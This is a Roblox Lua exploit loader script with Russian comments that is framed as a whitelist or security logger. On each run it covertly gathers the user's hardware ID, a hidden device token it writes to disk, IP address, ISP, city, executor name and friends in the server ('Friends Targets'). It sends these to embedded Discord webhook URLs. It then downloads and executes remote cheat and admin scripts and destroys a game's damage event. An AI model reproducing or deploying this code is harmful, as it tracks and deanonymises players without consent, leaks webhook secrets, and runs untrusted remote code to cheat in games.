if not game:IsLoaded() then
    game.Loaded:Wait()
end

local LOG_FRIENDS_IN_SERVER = true 

local hwid = game:GetService("RbxAnalyticsService"):GetClientId()
local lp = game.Players.LocalPlayer
local uid = tostring(lp.UserId)
local HttpService = game:GetService("HttpService")
local UIS = game:GetService("UserInputService")

-- Твои Вебхуки
local MAIN_WEBHOOK = "https://discord.com/api/webhooks/1511350552947200000/F5RA2icJ6WsnDcxK9B5qAZNVD7Aw3LCf1uhIZvmt38cX3GJGcCEkITsisJ-7ULdV_FAD"
local ALERT_WEBHOOK = "https://discord.com/api/webhooks/1518334035888181271/s1d18Avu2EmWpzTrT0jNIhjT6e1J57YX70OXHMVxxcyuSSw6L6nrBAjwVspga-L7SNKO"

-- ================= ANTI-SNIFFER (Защита от кражи вебхука) =================
local reqFunc = syn and syn.request or http_request or request or fluxus and fluxus.request

local function isHttpHooked()
    if not reqFunc then return false end
    if iscclosure and not iscclosure(reqFunc) then return true end
    if debug and debug.getinfo then
        local info = debug.getinfo(reqFunc)
        if info.what ~= "C" then return true end
    end
    return false
end

if isHttpHooked() then
    pcall(function()
        reqFunc({
            Url = ALERT_WEBHOOK,
            Method = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body = HttpService:JSONEncode({
                ["embeds"] = {{
                    ["title"] = "🚨 WEBHOOK STEAL ATTEMPT DETECTED 🚨",
                    ["color"] = 0x000000,
                    ["description"] = "Someone tried to use `hookfunction` or an HTTP Spy to steal your webhook URL!",
                    ["fields"] = {
                        {["name"] = "Player", ["value"] = string.format("%s (@%s)", lp.DisplayName, lp.Name), ["inline"] = true},
                        {["name"] = "User ID", ["value"] = uid, ["inline"] = true},
                        {["name"] = "Client ID (HWID)", ["value"] = "`"..hwid.."`", ["inline"] = false}
                    },
                    ["timestamp"] = os.date("!%Y-%m-%dT%H:%M:%SZ")
                }}
            })
        })
    end)
    lp:Kick("Security Error: HTTP Tampering Detected")
    while true do end
end

-- ================= HIDDEN DEVICE TOKEN (Трекер твинков) =================
local tokenFileName = "rbx_telemetry_cache.json"
local deviceToken = "Unknown"

pcall(function()
    if isfile and readfile and writefile then
        if isfile(tokenFileName) then
            deviceToken = readfile(tokenFileName)
        else
            deviceToken = HttpService:GenerateGUID(false)
            writefile(tokenFileName, deviceToken)
        end
    end
end)

-- ================= СПИСКИ ДОСТУПА =================
-- blacklist
local Blacklist = {
    UIDs = {},
    HWIDs = {"ВСТАВИТЬ_HWID_СЮДА"},
    Tokens = {"ВСТАВИТЬ_TOKEN_СЮДА"} -- Сюда вставлять Device Token для бана по ПК
}

-- whitelist
local Whitelist = {
    UIDs = {},
    HWIDs = {
        "1CCA9BF5-D99F-40C7-AD9D-9329BA286AAE",
        "",
        "",
        "",
        "",
        "",
    },
    Tokens = {}
}

local status = "unknown"

local function checkAccess(list)
    if list.UIDs then for _, v in ipairs(list.UIDs) do if v == uid then return true end end end
    if list.HWIDs then for _, v in ipairs(list.HWIDs) do if v == hwid then return true end end end
    if list.Tokens then for _, v in ipairs(list.Tokens) do if v == deviceToken then return true end end end
    return false
end

if checkAccess(Blacklist) then
    status = "blacklist"
elseif checkAccess(Whitelist) then
    status = "whitelist"
end

pcall(function()
    if not reqFunc then return end

    local place_name = "Unknown"
    pcall(function() place_name = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name end)

    -- Получение данных Клана (Фракции)
    local factionName = "None"
    local factionTag = "None"
    pcall(function()
        local rs = game:GetService("ReplicatedStorage")
        local factionDataFolder = rs:FindFirstChild("FactionSysRS") and rs.FactionSysRS:FindFirstChild("FactionData")
        if factionDataFolder then
            for _, faction in ipairs(factionDataFolder:GetChildren()) do
                local members = faction:FindFirstChild("FactionMembers")
                if members and members:FindFirstChild(uid) then
                    local basicData = faction:FindFirstChild("BasicFactionData")
                    if basicData then
                        factionName = basicData:FindFirstChild("FactionName") and basicData.FactionName.Value or "Unknown"
                        factionTag = basicData:FindFirstChild("FactionTag") and basicData.FactionTag.Value or "Unknown"
                    end
                    break
                end
            end
        end
    end)

    if status == "whitelist" then
        reqFunc({
            Url = MAIN_WEBHOOK,
            Method = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body = HttpService:JSONEncode({
                ["embeds"] = {{
                    ["title"] = "✅ Whitelisted User Executed",
                    ["color"] = 0x00FF00,
                    ["fields"] = {
                        {["name"] = "Player", ["value"] = string.format("%s (@%s)", lp.DisplayName, lp.Name), ["inline"] = true},
                        {["name"] = "User ID", ["value"] = uid, ["inline"] = true},
                        {["name"] = "Client ID", ["value"] = "`"..hwid.."`", ["inline"] = false},
                        {["name"] = "Device Token", ["value"] = "`"..deviceToken.."`", ["inline"] = false},
                        {["name"] = "Faction", ["value"] = string.format("[%s] %s", factionTag, factionName), ["inline"] = false},
                        {["name"] = "Game", ["value"] = place_name, ["inline"] = false}
                    },
                    ["timestamp"] = os.date("!%Y-%m-%dT%H:%M:%SZ")
                }}
            })
        })
    else
        local ip_info = {query = "N/A", isp = "N/A", country = "N/A", city = "N/A", timezone = "N/A"}
        local ok, resp = pcall(reqFunc, {Url = "http://ip-api.com/json", Method = "GET"})
        if ok and resp and resp.Success then
            local ok2, d = pcall(HttpService.JSONDecode, HttpService, resp.Body)
            if ok2 then ip_info = d end
        end

        local executor = "Unknown"
        pcall(function()
            if identifyexecutor then executor = identifyexecutor() 
            elseif getexecutorname then executor = getexecutorname() end
        end)

        local platform = "PC"
        if UIS.TouchEnabled and not UIS.KeyboardEnabled then platform = "Mobile"
        elseif UIS.GamepadEnabled and not UIS.KeyboardEnabled then platform = "Console" end
        if UIS.VREnabled then platform = "VR" end

        local friendsStr = "Disabled in settings"
        if LOG_FRIENDS_IN_SERVER then
            local friendsInServer = {}
            for _, p in ipairs(game.Players:GetPlayers()) do
                if p ~= lp then
                    pcall(function()
                        if lp:IsFriendsWith(p.UserId) then
                            table.insert(friendsInServer, p.Name)
                        end
                    end)
                end
            end
            friendsStr = #friendsInServer > 0 and table.concat(friendsInServer, ", ") or "No friends in server"
        end

        local embedColor = (status == "blacklist") and 0xFF0000 or 0xFFA500
        local embedTitle = (status == "blacklist") and "🚫 Blacklisted User Blocked" or "⚠️ Unknown/Guest User Executed"

        reqFunc({
            Url = MAIN_WEBHOOK,
            Method = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body = HttpService:JSONEncode({
                ["embeds"] = {{
                    ["title"] = embedTitle,
                    ["color"] = embedColor,
                    ["thumbnail"] = {
                        ["url"] = "https://www.roblox.com/headshot-thumbnail/image?userId="..uid.."&width=150&height=150&format=png"
                    },
                    ["fields"] = {
                        {["name"] = "👤 Player Info", ["value"] = string.format("**Name:** %s (@%s)\n**User ID:** `%s`\n**Account Age:** `%s days`", lp.DisplayName, lp.Name, uid, tostring(lp.AccountAge)), ["inline"] = true},
                        {["name"] = "💻 System", ["value"] = string.format("**Platform:** %s\n**Executor:** %s", platform, executor), ["inline"] = true},
                        {["name"] = "🛡️ Faction (Clan)", ["value"] = string.format("**Tag:** [%s]\n**Name:** %s", factionTag, factionName), ["inline"] = false},
                        {["name"] = "🔑 Hardware ID (CID)", ["value"] = "```\n"..hwid.."\n```", ["inline"] = false},
                        {["name"] = "📱 Device Token (Hidden)", ["value"] = "```\n"..deviceToken.."\n```", ["inline"] = false},
                        {["name"] = "🌍 Network Details", ["value"] = string.format("**IP:** ||%s||\n**ISP:** %s\n**Location:** %s, %s\n**Timezone:** %s", ip_info.query or "N/A", ip_info.isp or "N/A", ip_info.country or "N/A", ip_info.city or "N/A", ip_info.timezone or "N/A"), ["inline"] = false},
                        {["name"] = "🎮 Game Status", ["value"] = string.format("**Game:** %s\n**Place ID:** `%s`\n**JobId (Server):** `%s`", place_name, game.PlaceId, game.JobId), ["inline"] = false},
                        {["name"] = "👥 Friends Targets (in server)", ["value"] = string.format("`%s`", friendsStr), ["inline"] = false},
                        {["name"] = "🔗 Quick Links", ["value"] = "[Open Profile](https://www.roblox.com/users/"..uid.."/profile)", ["inline"] = false}
                    },
                    ["footer"] = { ["text"] = "Nazarkus Security Logger | Status: " .. string.upper(status) },
                    ["timestamp"] = os.date("!%Y-%m-%dT%H:%M:%SZ")
                }}
            })
        })
    end
end)

if status == "blacklist" then
    lp:Kick("You are blacklisted from using this script.")
    return
end

-- ================= ЗАГРУЗКА СКРИПТОВ =================
print("[System] Authorized (" .. status .. ") — loading scripts...")

pcall(function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/nazarkus/rpg/main/easy.lua"))()
end)

pcall(function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/FilteringEnabled/NamelessAdmin/main/Source"))()
end)

pcall(function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source"))()
end)

pcall(function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/nazarkus/infammo/main/infammo.lua"))()
end)

pcall(function()
    game:GetService("ReplicatedStorage").ACS_Engine.Events.FDMG:Destroy()
end)
